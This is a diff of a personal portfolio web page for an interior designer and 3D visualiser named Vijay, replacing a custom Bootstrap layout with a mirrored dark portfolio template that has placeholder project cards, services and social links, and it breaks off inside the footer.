@@ -1,643 +1,736 @@
 <!doctype html>
-<html lang="en">
+<html class="no-js" lang="en">
+
+
+<!-- Mirrored from theme-land.com/Portfolio/demo/index-dark.html by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 12 Dec 2024 08:55:27 GMT -->
 <head>
-	<meta charset="utf-8">
+	<meta charset="UTF-8">
+	<meta name="description" content="">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
 	<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-	<meta name="description" content />
-	<meta name="keywords" content />
-	<link
-		href="https://fonts.googleapis.com/css2?family=Mulish:wght@400;700&amp;family=Roboto+Mono:wght@400;500;700&amp;display=swap"
-		rel="stylesheet">
-	<link rel="stylesheet" href="css/bootstrap.min.css">
-	<link rel="stylesheet" href="css/owl.carousel.min.css">
-	<link rel="stylesheet" href="css/owl.theme.default.min.css">
-	<link rel="stylesheet" href="fonts/icomoon/style.css">
-	<link rel="stylesheet" href="fonts/flaticon/font/flaticon.css">
-	<link rel="stylesheet" href="css/aos.css">
-	<link rel="stylesheet" href="css/style.css">
-	<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0/dist/fancybox/fancybox.css" />
-	<title>Portflio Space</title>
-	<style>
-		/* Basic styling (Customize as needed!) */
-.filter-buttons button {
-  margin: 10px;
-  padding: 8px 15px;
-  border: none;
-  background-color: #ddd;
-  cursor: pointer;
-}
+	<!-- The above 4 meta tags *must* come first in the head; any other head content must come *after* these tags -->
 
-.btn.btn-bllack {
-    background: #ffffff;
-   
-	color: #000000;
-}
+	<!-- Title  -->
+	<title>Portfolio - Personal Portfolio</title>
 
-.btn.btn-blllack {
-	background: #000000;
-	color: #ffffff;
-}
-.filter-buttons {
-  display: flex;
-  flex-wrap: wrap;
-  justify-content: space-around;
-  gap: 10px;
-  max-width: 800px; /* Adjust the max width as needed */
-  margin: 0 auto;  /* Center the container horizontally */
-}
+	<!-- Favicon  -->
+	<link rel="icon" href="assets/img/favicon.png">
 
+	<!-- ***** All CSS Files ***** -->
 
-/* Media Query for Desktop */
-@media (min-width: 768px) { /* Adjust the breakpoint if needed */
-  .filter-buttons {
-    gap: 5px; 
-  }
-}
-
-#load-more {
-    background: #000000;
-	color: #ffffff;
-}
-#load-more:hover {
-	border-color: #000000;
-	background: transparent;
-	color: #000000;
-}
-
-.button-container {
-    display: flex;          /* Enable flexbox */   
-    justify-content: center;/* Center horizontally */
-    width: 100%;            /* Container spans full width */
- }
-.filter-text {
-  /* ... your other styles ... */
-  text-decoration: none;  /* Remove default underline initially */
-  cursor: pointer;
-}
-
-.filter-text:hover {
-  text-decoration: underline;  /* Underline on hover */
-  color: rgb(0, 0, 0); /* Optional: Example of color change on hover */
-}
-
-.certification-section {
-  background-color: black; 
-  padding: 30px; 
-  display: grid;           /* Enable grid layout */
-  place-items: center;     /* Center the content both horizontally and vertically */
-}
-
-
-.certification-content {
-  background-color: white; 
-  padding: 20px;           
-  margin: 20px auto;      /* Center using automatic margins */ 
-  border-radius: 5px;     
-  display: inline-block;  /* Necessary for margin: auto to work horizontally */
-  max-width: 80%;         /* Prevent stretching too wide */
-}
-
-.filter-buttons button.active {
-    background-color: #ffffff;
-    color: #ff2e63;
-}
-		.overlay {
-			position: absolute;
-			top: 0;
-			left: 0;
-			width: 100%;
-			height: 100%;
-			background: rgba(0, 0, 0, 0.5);
-			display: none;
-		}
-
-		.overlay-text {
-			color: white;
-			font-size: 20px;
-			text-align: center;
-			margin-top: 50%;
-		}
-
-		.item:hover .overlay {
-			display: block;
-		}
-		
-	</style>
+	<!-- Style css -->
+	<link rel="stylesheet" href="assets/css/style.css">
 
 </head>
 
-<body data-spy="scroll" data-target=".site-navbar-target" data-offset="100" style="background-color:rgb(255, 255, 255);">
-	<div class="site-mobile-menu site-navbar-target">
-		<div class="site-mobile-menu-header">
-			<div class="site-mobile-menu-close">
-				<span class="icofont-close js-menu-toggle"></span>
-			</div>
-		</div>
-		<div class="site-mobile-menu-body"></div>
+<body class="odd">
+	<!-- ***** Magic Cursor Area Start ***** -->
+	<div id="magic-cursor">
+		<div id="cursor"></div>
 	</div>
-	<nav class="site-nav dark mb-5 site-navbar-target">
-		<div class="container">
-			<div class="site-navigation">
-				<a href="index-2.html" class="logo m-0">Portfolio<span class="text-primary">.</span></a>
-				<ul class="js-clone-nav d-none d-lg-inline-none site-menu float-right site-nav-wrap">
-					<li><a href="#home-section" class="nav-link active">Home</a></li>
-					<li><a href="#portfolio-section" class="nav-link">Portfolio</a></li>
-					<!-- <li><a href="#services-section" class="nav-link">Services</a></li>-->
-					<li class="has-children">
-						<a href="#about-section" class="nav-link">About</a>
-						<!-- <ul class="dropdown">
-							<li><a href="elements.html" class="nav-link">Elements</a></li>
-							
-							<li><a href="#" class="nav-link">Menu Three</a></li>
-						</ul> -->
-					</li>
-					<li><a href="#contact-section" class="nav-link">Contact us</a></li>
-				</ul>
-				<a href="#"
-					class="burger ml-auto float-right site-menu-toggle js-menu-toggle d-inline-block d-lg-inline-block"
-					data-toggle="collapse" data-target="#main-navbar">
-					<span></span>
-				</a>
-			</div>
-		</div>
-	</nav>
-	<!-- <div class="untree_co-section pb-0" id="home-section">
-		<div class="container">
-			<h1 class="heading gsap-reveal-hero mb-0">Hey! I'm <strong>Vijay</strong><span
-					class="text-primary">.</span></strong>
-			</h1>
-			<h2 class="subheading gsap-reveal-hero mb-4">
-				Experience the elegance and sophistication of my work showcased through a sleek and minimalistic design
-				by <strong>Vijay Sharma</strong>.
-			</h2>
-			<p class="gsap-reveal-hero"><a href="#contact-section" target="_blank" class="btn btn-black">Lets Work
-					Together.</a></p>
-		</div>
-	</div> -->
-	<div class="untree_co-section untree_co-section-4 pb-0" id="portfolio-section">
-		<div class="container">
+	<!-- ***** Magic Cursor Area End ***** -->
 
-			<div class="filter-buttons">
-				<span class="filter-text" data-filter="all">ALL</span>
-				<span class="filter-text" data-filter="natural">NATURAL</span>
-				<span class="filter-text" data-filter="creative">CREATIVE</span>
-				<span class="filter-text" data-filter="personal">PERSONAL</span>
-				<span class="filter-text" data-filter="photography">PHOTOGRAPHY</span>
-			</div>
-		
-<div><br></div>
-			<div class="relative">
-				<div class="loader-portfolio-wrap">
-					<div class="loader-portfolio"></div>
-				</div>
-			</div>
-			<div id="portfolio-single-holder"></div>
-			<div class="portfolio-wrapper">
-				<div id="posts" class="row">
+	<!-- ***** Preloader Area Start ***** -->
+	<div class="preloader">
+		<svg viewBox="0 0 1000 1000" preserveAspectRatio="none">
+			<path id="loader" d="M0,1005S175,995,500,995s500,5,500,5V0H0Z"></path>
+		</svg>
 
-					<div class="item web branding natural col-sm-6 col-md-6 col-lg-4 isotope-mb-2"> <a href="images/web/1.jpg"
-							data-fancybox="project-gallery"> <img src="images/res/1.webp" class="lazyload img-fluid"
-								alt="Images" />
-							<div class="overlay">
-								<p class="overlay-text">Your text here</p>
-							</div>
-						</a>
-					</div>
-
-					<div class="item web branding photography col-sm-6 col-md-6 col-lg-4 isotope-mb-2"> <a href="images/web/2.jpg"
-							data-fancybox="project-gallery"> <img src="images/res/2.webp" class="lazyload img-fluid"
-								alt="Images" />
-							<div class="overlay">
-								<p class="overlay-text">Your text here</p>
-							</div>
-						</a>
-					</div>
-
-					<div class="item web branding col-sm-6 col-md-6 col-lg-4 isotope-mb-2"> <a href="images/web/3.jpg"
-							data-fancybox="project-gallery"> <img src="images/res/3.webp" class="lazyload img-fluid"
-								alt="Images" />
-							<div class="overlay">
-								<p class="overlay-text">Your text here</p>
-							</div>
-						</a>
-					</div>
-					<div class="item web branding col-sm-6 col-md-6 col-lg-4 isotope-mb-2">
-						<a href="images/web/4.jpg" data-fancybox="project-gallery"> <img src="images/res/4.webp"
-								class="lazyload img-fluid" alt="Images" />
-							<div class="overlay">
-								<p class="overlay-text">Your text here</p>
-							</div>
-						</a>
-					</div>
-					<div class="item web branding col-sm-6 col-md-6 col-lg-4 isotope-mb-2">
-						<a href="images/web/5.jpg" data-fancybox="project-gallery"> <img src="images/res/5.webp"
-								class="lazyload img-fluid" alt="Images" />
-							<div class="overlay">
-								<p class="overlay-text">Your text here</p>
-							</div>
-						</a>
-					</div>
-					<div class="item web branding col-sm-6 col-md-6 col-lg-4 isotope-mb-2">
-						<a href="images/web/6.jpg" data-fancybox="project-gallery"> <img src="images/res/6.webp"
-								class="lazyload img-fluid" alt="Images" />
-							<div class="overlay">
-								<p class="overlay-text">Your text here</p>
-							</div>
-						</a>
-					</div>
-					<div class="item web branding col-sm-6 col-md-6 col-lg-4 isotope-mb-2">
-						<a href="images/web/7.jpg" data-fancybox="project-gallery"> <img src="images/res/7.webp"
-								class="lazyload img-fluid" alt="Images" />
-							<div class="overlay">
-								<p class="overlay-text">Your text here</p>
-							</div>
-						</a>
-					</div>
-					<div class="item web branding col-sm-6 col-md-6 col-lg-4 isotope-mb-2">
-						<a href="images/web/8.jpg" data-fancybox="project-gallery"> <img src="images/res/8.webp"
-								class="lazyload img-fluid" alt="Images" />
-							<div class="overlay">
-								<p class="overlay-text">Your text here</p>
-							</div>
-						</a>
-					</div>
-					<div class="item web branding col-sm-6 col-md-6 col-lg-4 isotope-mb-2">
-						<a href="images/web/9.jpg" data-fancybox="project-gallery"> <img src="images/res/9.webp"
-								class="lazyload img-fluid" alt="Images" />
-							<div class="overlay">
-								<p class="overlay-text">Your text here</p>
-							</div>
-						</a>
-					</div>
-					<div class="item web branding col-sm-6 col-md-6 col-lg-4 isotope-mb-2">
-						<a href="images/web/10.jpg" data-fancybox="project-gallery"> <img src="images/res/10.webp"
-								class="lazyload img-fluid" alt="Images" />
-							<div class="overlay">
-								<p class="overlay-text">Your text here</p>
-							</div>
-						</a>
-					</div>
-					<div class="item web branding col-sm-6 col-md-6 col-lg-4 isotope-mb-2">
-						<a href="images/web/11.jpg" data-fancybox="project-gallery"> <img src="images/res/11.webp"
-								class="lazyload img-fluid" alt="Images" />
-							<div class="overlay">
-								<p class="overlay-text">Your text here</p>
-							</div>
-						</a>
-					</div>
-					<div class="item web branding col-sm-6 col-md-6 col-lg-4 isotope-mb-2">
-						<a href="images/web/12.jpg" data-fancybox="project-gallery"> <img src="images/res/12.webp"
-								class="lazyload img-fluid" alt="Images" />
-							<div class="overlay">
-								<p class="overlay-text">Your text here</p>
-							</div>
-						</a>
-					</div>
-				</div>
-				<div class="button-container">
-				<button id="load-more" class="btn btn-blllack" >Load More</button>
+		<!-- Loader Container -->
+		<div class="loader-container">
+			<div class="loaded">
+				<span>L</span>
+				<span>O</span>
+				<span>A</span>
+				<span>D</span>
+				<span>I</span>
+				<span>N</span>
+				<span>G</span>
 			</div>
-			</div>
-
 		</div>
 	</div>
+	<!-- ***** Preloader Area End ***** -->
 
-	<div class="untree_co-section pb-0" id="about-section">
-		<div class="container">
-			<div class="row mb-4">
-				<div class="col-lg-6 text-left">
-					<h2 class="section-heading gsap-reveal-hero mb-0"><strong>About</strong></h2>
-					<p class="gsap-reveal-hero">Junior Interior Designer</p>
-					<div class="wave gsap-reveal-hero">
-						<svg>
-							<path d="M10,10 L50,100 L90,50"></path>
-						</svg>
+	<!-- ***** Main Area Start ***** -->
+	<div class="main">
+		<!-- ***** Header Start ***** -->
+		<header id="header">
+			<!-- Navbar -->
+			<nav class="navbar navbar-expand">
+				<div class="container header">
+					<!-- Navbar Brand-->
+					<div class="magnetic">
+						<a class="navbar-brand" href="index-dark.html">
+							Portfolio.
+						</a>
 					</div>
+					<div class="ms-auto"></div>
+
+					<!-- Navbar Nav -->
+					<ul class="navbar-nav items d-none d-md-block">
+						<li class="nav-item">
+							<a href="index-dark.html" class="nav-link active">Home</a>
+						</li>
+						<li class="nav-item">
+							<a href="portfolio-dark.html" class="nav-link">Works</a>
+						</li>
+						<li class="nav-item">
+							<a href="about-dark.html" class="nav-link">About</a>
+						</li>
+						<li class="nav-item">
+							<a href="contact-dark.html" class="nav-link">Contact</a>
+						</li>
+					</ul>
+
+					<!-- Navbar Toggler -->
+					<div class="navbar-toggler scrolled" data-bs-toggle="offcanvas" data-bs-target="#offcanvasRight">
+						<div class="navbar-header">
+							<div class="content">
+								<div class="toggler-icon"></div>
+								<span class="title">Menu</span>
+							</div>
+						</div>
+					</div>
+
 				</div>
+			</nav>
+
+			<div id="navbar-main" class="main">
+				
 			</div>
-			<div class="row">
-				<div class="col-lg-6 position-relative">
-					<div class="experience-wrap gsap-reveal-hero">
-						<div class="experience">
-							<span class="d-block">21 Months of experience</span>
-							<a href="#portfolio-section" class="smoothscroll"> <span class="icon-arrow_forward"></span>
-								See portfolio</a>
-							<a href="#"><span class="icon-arrow_forward"></span> Download my CV</a>
+		</header>
+		<!-- ***** Header End ***** -->
+
+		<!-- ***** Main Wrapper Start ***** -->
+		<div id="main-wrapper" class="main-wrapper">
+
+			<!-- ***** Hero Area Start ***** -->
+			<section id="home" class="hero-section">
+				<div class="container">
+					<div class="row">
+						<div class="col-12">
+							<!-- Hero Content -->
+							<div class="hero-content">
+								<span class="intro-text">Hello! I’m Vijay.</span>
+								<h1 class="title section-title mt-3 mt-md-4 mb-md-5">Turning visions into reality through inspiring <span>renders and visual design</span></h1>
+
+								<!-- Content -->
+								<div class="content d-flex flex-column flex-md-row justify-content-md-between">
+									<div class="hero-button order-last order-md-first mt-4 mt-md-0">
+										<a class="btn magnetic-button" href="contact-dark.html">Let's Talk! <i class="icon bi bi-arrow-right ms-1"></i><span></span></a>
+									</div>
+									</div>
+
+							</div>
 						</div>
 					</div>
-					<figure class="dotted-bg gsap-reveal-img">
-						<img src="images/about_pic.jpg" alt="Image" class="img-fluid">
-					</figure>
 				</div>
-				<div class="col-lg-6 pl-md-5">
-					<h3 class="text-black h5 font-weight-bold mb-3 gsap-reveal-hero">Bio</h3>
-					<p class="gsap-reveal-hero">I am Vijay Sharma B.Des (Interior Designer),
-						Passionate about using software skills. A
-						creative vision to create beautiful and
-						functional interior spaces.</p>
-					<!-- <p class="gsap-reveal-hero ">A small river named Duden flows by their place and supplies it with the
-						necessary regelialia. It is a paradisematic country, in which roasted parts of sentences fly
-						into your mouth.</p> -->
-					<div class="row my-5">
+				<div class="hero-bg">
+					<img class="circle-1" src="assets/img/content/hero-bg-1.svg" alt="">
+					<img class="circle-2" src="assets/img/content/hero-bg-2.svg" alt="">
+				</div>
+			</section>
+			<!-- ***** Hero Area End ***** -->
+
+			<!-- ***** Works Area Start ***** -->
+			<section class="works position-relative p-0">
+				<div class="container">
+					<div class="row">
 						<div class="col-12">
-							<h3 class="text-black h5 font-weight-bold mb-3 gsap-reveal-hero">Work Experience</h3>
-						</div>
-						<div class="col-lg-6">
-							<div class="work-experience gsap-reveal-hero">
-								<h3 class="position">Junior Interior Designer</h3>
-								<span class="company">Montdor Interior Pvt Ltd</span>
-								<span class="year">15 Months</span>
+							<!-- Intro -->
+							<div class="intro d-flex justify-content-between align-items-center">
+								<h3 class="title">Selected Works</h3>
+								<a class="btn btn-outline content-btn swap-icon" href="portfolio-dark.html">View All <i class="icon bi bi-arrow-right-short"></i></a>
 							</div>
 						</div>
-						<div class="col-lg-6">
-							<div class="work-experience gsap-reveal-hero">
-								<h3 class="position">Intern </h3>
-								<span class="company">SPACEGENICS</span>
-								<span class="year">6 Months</span>
-							</div>
-						</div>
-						
-
-						
-
-						<div class="col-12">
-							<h3 class="text-black h5 font-weight-bold mb-3 gsap-reveal-hero">Skills</h3>
-						</div>
-						<div class="col-lg-6">
-							<div class="work-experience gsap-reveal-hero">
-								<h3 class="position">A.I.</h3>
-							</div>
-							<ul style="list-style-type:disc">
-								<li>Automatic 1111</li>
-								<li>Comfyui</li>
-								<li>Forge Web UI</li>
-								<li>Fooocus</li>
-								<li>Chainer</li>
-							</ul>
-							<div class="work-experience gsap-reveal-hero">
-								<h3 class="position">Code</h3>
-							</div>
-							<ul style="list-style-type:disc">
-								<li>Python</li>
-								<li>Batch</li>
-								<li>V#</li>
-								<li>C++</li>
-							
-							</ul>
-							
-						</div>
-
-
-						<div class="col-lg-6">
-							<div class="work-experience gsap-reveal-hero">
-							<h3 class="position">Softwares</h3>
-						</div>
-							
-							<ul style="list-style-type:disc">
-								<li>AUTOCAD</li>
-								<li>LUMION</li>
-								<li>Cinema 4D</li>
-								<li>3DS MAX</li>
-								<li>PHOTOSHOP</li>
-								<li>TWINMOTION</li>
-								<li>CORONA RENDERER</li>
-								<li>SKETCHUP</li>
-								<li>QUIXEL MIXER</li>
-								<li>ENSCAPE</li>
-								<li>ILLUSTRATOR</li>
-								<li>Blender</li>
-							</ul>
-						
-						</div>
-						
-						
 					</div>
+					<div class="row">
+						<div class="stack-wrapper">
+							<!-- Stack Item -->
+							<div class="stack-item">
+								<div class="card portfolio-item layout-2 scale has-shadow">
+									<div class="image-holder">
+										<!-- Card Thumb -->
+										<a class="card-thumb" href="portfolio-single-dark.html">
+											<img src="assets/img/content/case-1.jpg" alt="">
+										</a>
+										<!-- Card Overlay -->
+										<div class="card-overlay">
+											<div class="heading">
+												<h4 class="title mt-2 mt-md-3 mb-3"></h4>
+												<div class="show-project">
+													<div class="card-terms">
+														<a class="terms badge outlined" href="#"></a>
+														<a class="terms badge outlined" href="#"></a>
+													</div>
+													<div class="project-link">
+														<a href="portfolio-single-dark.html"></a>
+													</div>
+												</div>
+											</div>
+										</div>
+									</div>
+								</div>
+							</div>
+							<!-- Stack Item -->
+							<div class="stack-item">
+								<!-- Card Element -->
+								<div class="card portfolio-item layout-2 scale has-shadow">
+									<div class="image-holder">
+										<!-- Card Thumb -->
+										<a class="card-thumb" href="portfolio-single-dark.html">
+											<img src="assets/img/content/case-2.jpg" alt="">
+										</a>
+										<!-- Card Overlay -->
+										<div class="card-overlay">
+											<div class="heading">
+												<h4 class="title mt-2 mt-md-3 mb-3"></h4>
+												<div class="show-project">
+													<div class="card-terms">
+														<a class="terms badge outlined" href="#"></a>
+														<a class="terms badge outlined" href="#"></a>
+													</div>
+													<div class="project-link">
+														<a href="portfolio-single-dark.html"></a>
+													</div>
+												</div>
+											</div>
+										</div>
+									</div>
+								</div>
+							</div>
+							<!-- Stack Item -->
+							<div class="stack-item">
+								<div class="card portfolio-item layout-2 scale has-shadow">
+									<div class="image-holder">
+										<!-- Card Thumb -->
+										<a class="card-thumb" href="portfolio-single-dark.html">
+											<img src="assets/img/content/case-3.jpg" alt="">
+										</a>
+										<!-- Card Overlay -->
+										<div class="card-overlay">
+											<div class="heading">
+												<h4 class="title mt-2 mt-md-3 mb-3"></h4>
+												<div class="show-project">
+													<div class="card-terms">
+														<a class="terms badge outlined" href="#"></a>
+													</div>
+													<div class="project-link">
+														<a href="portfolio-single-dark.html"></a>
+													</div>
+												</div>
+											</div>
+										</div>
+									</div>
+								</div>
+							</div>
+							<!-- Stack Item -->
+							<div class="stack-item">
+								<div class="card portfolio-item layout-2 scale has-shadow">
+									<div class="image-holder">
+										<!-- Card Thumb -->
+										<a class="card-thumb" href="portfolio-single-dark.html">
+											<img src="assets/img/content/case-4.jpg" alt="">
+										</a>
+										<!-- Card Overlay -->
+										<div class="card-overlay">
+											<div class="heading">
+												<h4 class="title mt-2 mt-md-3 mb-3"></h4>
+												<div class="show-project">
+													<div class="card-terms">
+														<a class="terms badge outlined" href="#"></a>
+														<a class="terms badge outlined" href="#"></a>
+													</div>
+													<div class="project-link">
+														<a href="portfolio-single-dark.html"></a>
+													</div>
+												</div>
+											</div>
+										</div>
+									</div>
+								</div>
+							</div>
+							<div class="stack-item">
+								<div class="card portfolio-item layout-2 scale has-shadow">
+									<div class="image-holder">
+										<!-- Card Thumb -->
+										<a class="card-thumb" href="portfolio-single-dark.html">
+											<img src="assets/img/content/case-5.jpg" alt="">
+										</a>
+										<!-- Card Overlay -->
+										<div class="card-overlay">
+											<div class="heading">
+												<h4 class="title mt-2 mt-md-3 mb-3"></h4>
+												<div class="show-project">
+													<div class="card-terms">
+														<a class="terms badge outlined" href="#"></a>
+														<a class="terms badge outlined" href="#"></a>
+													</div>
+													<div class="project-link">
+														<a href="portfolio-single-dark.html"></a>
+													</div>
+												</div>
+											</div>
+										</div>
+									</div>
+								</div>
+							</div>
+							<div class="stack-item">
+								<div class="card portfolio-item layout-2 scale has-shadow">
+									<div class="image-holder">
+										<!-- Card Thumb -->
+										<a class="card-thumb" href="portfolio-single-dark.html">
+											<img src="assets/img/content/case-6.jpg" alt="">
+										</a>
+										<!-- Card Overlay -->
+										<div class="card-overlay">
+											<div class="heading">
+												<h4 class="title mt-2 mt-md-3 mb-3"></h4>
+												<div class="show-project">
+													<div class="card-terms">
+														<a class="terms badge outlined" href="#"></a>
+														<a class="terms badge outlined" href="#"></a>
+													</div>
+													<div class="project-link">
+														<a href="portfolio-single-dark.html"></a>
+													</div>
+												</div>
+											</div>
+										</div>
+									</div>
+								</div>
+							</div>
+							<div class="stack-item">
+								<div class="card portfolio-item layout-2 scale has-shadow">
+									<div class="image-holder">
+										<!-- Card Thumb -->
+										<a class="card-thumb" href="portfolio-single-dark.html">
+											<img src="assets/img/content/case-7.jpg" alt="">
+										</a>
+										<!-- Card Overlay -->
+										<div class="card-overlay">
+											<div class="heading">
+												<h4 class="title mt-2 mt-md-3 mb-3"></h4>
+												<div class="show-project">
+													<div class="card-terms">
+														<a class="terms badge outlined" href="#"></a>
+														<a class="terms badge outlined" href="#"></a>
+													</div>
+													<div class="project-link">
+														<a href="portfolio-single-dark.html"></a>
+													</div>
+												</div>
+											</div>
+										</div>
+									</div>
+								</div>
+							</div>
+							<div class="stack-item">
+								<div class="card portfolio-item layout-2 scale has-shadow">
+									<div class="image-holder">
+										<!-- Card Thumb -->
+										<a class="card-thumb" href="portfolio-single-dark.html">
+											<img src="assets/img/content/case-8.jpg" alt="">
+										</a>
+										<!-- Card Overlay -->
+										<div class="card-overlay">
+											<div class="heading">
+												<h4 class="title mt-2 mt-md-3 mb-3"></h4>
+												<div class="show-project">
+													<div class="card-terms">
+														<a class="terms badge outlined" href="#"></a>
+														<a class="terms badge outlined" href="#"></a>
+													</div>
+													<div class="project-link">
+														<a href="portfolio-single-dark.html"></a>
+													</div>
+												</div>
+											</div>
+										</div>
+									</div>
+								</div>
+							</div>
+							<div class="stack-item">
+								<div class="card portfolio-item layout-2 scale has-shadow">
+									<div class="image-holder">
+										<!-- Card Thumb -->
+										<a class="card-thumb" href="portfolio-single-dark.html">
+											<img src="assets/img/content/case-9.jpg" alt="">
+										</a>
+										<!-- Card Overlay -->
+										<div class="card-overlay">
+											<div class="heading">
+												<h4 class="title mt-2 mt-md-3 mb-3"></h4>
+												<div class="show-project">
+													<div class="card-terms">
+														<a class="terms badge outlined" href="#"></a>
+														<a class="terms badge outlined" href="#"></a>
+													</div>
+													<div class="project-link">
+														<a href="portfolio-single-dark.html"></a>
+													</div>
+												</div>
+											</div>
+										</div>
+									</div>
+								</div>
+							</div>
+							<div class="stack-item">
+								<div class="card portfolio-item layout-2 scale has-shadow">
+									<div class="image-holder">
+										<!-- Card Thumb -->
+										<a class="card-thumb" href="portfolio-single-dark.html">
+											<img src="assets/img/content/case-10.jpg" alt="">
+										</a>
+										<!-- Card Overlay -->
+										<div class="card-overlay">
+											<div class="heading">
+												<h4 class="title mt-2 mt-md-3 mb-3"></h4>
+												<div class="show-project">
+													<div class="card-terms">
+														<a class="terms badge outlined" href="#"></a>
+														<a class="terms badge outlined" href="#"></a>
+													</div>
+													<div class="project-link">
+														<a href="portfolio-single-dark.html"></a>
+													</div>
+												</div>
+											</div>
+										</div>
+									</div>
+								</div>
+							</div>
+							<div class="stack-item">
+								<div class="card portfolio-item layout-2 scale has-shadow">
+									<div class="image-holder">
+										<!-- Card Thumb -->
+										<a class="card-thumb" href="portfolio-single-dark.html">
+											<img src="assets/img/content/case-11.jpg" alt="">
+										</a>
+										<!-- Card Overlay -->
+										<div class="card-overlay">
+											<div class="heading">
+												<h4 class="title mt-2 mt-md-3 mb-3"></h4>
+												<div class="show-project">
+													<div class="card-terms">
+														<a class="terms badge outlined" href="#"></a>
+														<a class="terms badge outlined" href="#"></a>
+													</div>
+													<div class="project-link">
+														<a href="portfolio-single-dark.html"></a>
+													</div>
+												</div>
+											</div>
+										</div>
+									</div>
+								</div>
+							</div>
+							<div class="stack-item">
+								<div class="card portfolio-item layout-2 scale has-shadow">
+									<div class="image-holder">
+										<!-- Card Thumb -->
+										<a class="card-thumb" href="portfolio-single-dark.html">
+											<img src="assets/img/content/case-12.jpg" alt="">
+										</a>
+										<!-- Card Overlay -->
+										<div class="card-overlay">
+											<div class="heading">
+												<h4 class="title mt-2 mt-md-3 mb-3"></h4>
+												<div class="show-project">
+													<div class="card-terms">
+														<a class="terms badge outlined" href="#"></a>
+														<a class="terms badge outlined" href="#"></a>
+													</div>
+													<div class="project-link">
+														<a href="portfolio-single-dark.html"></a>
+													</div>
+												</div>
+											</div>
+										</div>
+									</div>
+								</div>
+							</div>
+							<div class="stack-item">
+								<div class="card portfolio-item layout-2 scale has-shadow">
+									<div class="image-holder">
+										<!-- Card Thumb -->
+										<a class="card-thumb" href="portfolio-single-dark.html">
+											<img src="assets/img/content/case-13.jpg" alt="">
+										</a>
+										<!-- Card Overlay -->
+										<div class="card-overlay">
+											<div class="heading">
+												<h4 class="title mt-2 mt-md-3 mb-3"></h4>
+												<div class="show-project">
+													<div class="card-terms">
+														<a class="terms badge outlined" href="#"></a>
+														<a class="terms badge outlined" href="#"></a>
+													</div>
+													<div class="project-link">
+														<a href="portfolio-single-dark.html"></a>
+													</div>
+												</div>
+											</div>
+										</div>
+									</div>
+								</div>
+							</div>
+							<div class="stack-item">
+								<div class="card portfolio-item layout-2 scale has-shadow">
+									<div class="image-holder">
+										<!-- Card Thumb -->
+										<a class="card-thumb" href="portfolio-single-dark.html">
+											<img src="assets/img/content/case-14.jpg" alt="">
+										</a>
+										<!-- Card Overlay -->
+										<div class="card-overlay">
+											<div class="heading">
+												<h4 class="title mt-2 mt-md-3 mb-3"></h4>
+												<div class="show-project">
+													<div class="card-terms">
+														<a class="terms badge outlined" href="#"></a>
+														<a class="terms badge outlined" href="#"></a>
+													</div>
+													<div class="project-link">
+														<a href="portfolio-single-dark.html"></a>
+													</div>
+												</div>
+											</div>
+										</div>
+									</div>
+								</div>
+							</div>
+							
+						</div>
+					</div>
+				</div>
+			</section>
+			<!-- ***** Works Area End ***** -->
+
+			<!-- ***** Services Area Start ***** -->
+			<section class="services">
+				<div class="container">
 					
+
+					<div class="row service-wrapper items mt-md-5">
+						<!-- Service Item -->
+						<div class="col-12 col-md-6 col-lg-4">
+						<br><br>
+						<h2 class="title mb-0 mb-md-2">What i do.</h2>
+							<div class="item d-flex align-items-start">
+							
+							<br>
+								<div class="item-count">01</div>
+								<div class="content">
+									<h4 class="mt-0">2D</h4>
+									</div>
+							</div>
+						</div>
+
+						<!-- Service Item -->
+						<div class="col-12 col-md-6 col-lg-4">
+							<div class="item d-flex align-items-start">
+								<div class="item-count">02</div>
+								<div class="content">
+									<h4 class="mt-0">3D Design, Modeling</h4>
+									</div>
+							</div>
+						</div>
+
+						<!-- Service Item -->
+						<div class="col-12 col-md-6 col-lg-4">
+							<div class="item d-flex align-items-start">
+								<div class="item-count">03</div>
+								<div class="content">
+									<h4 class="mt-0">Render, Visualisation</h4>
+									</div>
+							</div>
+						</div>
+					</div>
 				</div>
-				<div class="col-12">
-					<br>
-					<br>
-					<h3 class="text-black h5 font-weight-bold mb-3 gsap-reveal-hero">10+ Render Engine i Worked in</h3>
+
+				<!-- Marquee -->
+				<div class="marquee">
+					<ul class="list-unstyled">
+						
+					</ul>
 				</div>
 
-				<ul style="list-style-type:disc">
-					<li class="position">OctaneRender | Redshift | Cycles | Eevee | Arnold Render | D5 | V-Ray | Corona | Twinmotion | Keyshot | Maxwell</li>
-				</ul>
 				
-				
-				
-			  </div>
 
-			  <div class="certification-section">  
-				<div class="certification-content">  
-					<div class="col-12"> 
-				<br> <br> 
-				<h3 class="text-black h5 font-weight-bold mb-3 gsap-reveal-hero">Certification</h3>
-			  </div>
-			  <ul style="list-style-type:disc">
-				<li class="position">Interior Design With Curves Mastering</li>
-				<li class="position">Light : Architectural Design & Interior Decoration</li>
-				<li class="position">Adobe Photoshop Complete Mastery</li>
-				<li class="position">3D Visualization For Beginners: Interior Scene with 3ds Max</li>
-				<li class="position">How to Use Color Like a Pro</li>
-				<li class="position">Interior Design With Curves Mastering</li>
-				</ul>
-			</div>
-			</div>
+			<!-- ***** CTA Area Start ***** -->
+			<section class="cta border-top border-light-subtle">
+				<div class="container">
+					<div class="row justify-content-center text-center">
+						<div class="col-12 col-md-10 col-lg-7">
+							<h2 class="title mb-0 mb-md-2">Let's Create Something</h2>
+							<div class="cta-text">
+								<span class="line-item">Together</span>
+								<span class="line"></span>
+								<a class="btn magnetic-button" href="contact-dark.html">Get In Touch! <i class="icon bi bi-arrow-right ms-1"></i><span></span></a>
+							</div>
 
-			
-		</div>
-		
-	</div>
-	
+							<!-- Socials -->
+							<div class="socials mt-5">
+								<nav class="nav justify-content-center">
+									<a class="nav-link swap-icon" href="https://instagram.com/vijay.3d_">Instagram <i class="icon rotate bi bi-arrow-right-short"></i></a>
+									<a class="nav-link swap-icon" href="https://www.linkedin.com/in/vijay-sharma-a97965239/">Linkedin <i class="icon rotate bi bi-arrow-right-short"></i></a>
+								</nav>
+							</div>
+						</div>
+					</div>
+				</div>
+			</section>
+			<!-- ***** CTA Area End ***** -->
 
+			<!-- ***** Footer Area Start ***** -->
+			<footer class="footer-area">
+				<div class="container">
+					<div class="row">
+						<div class="col-12">
+							<div class="footer-content d-flex flex-wrap justify-content-center justify-content-md-between align-items-center py-4">
+								<!-- Copyright -->
+								<div class="copyright">&copy;2024 Portfolio, All Rights Reserved</div>
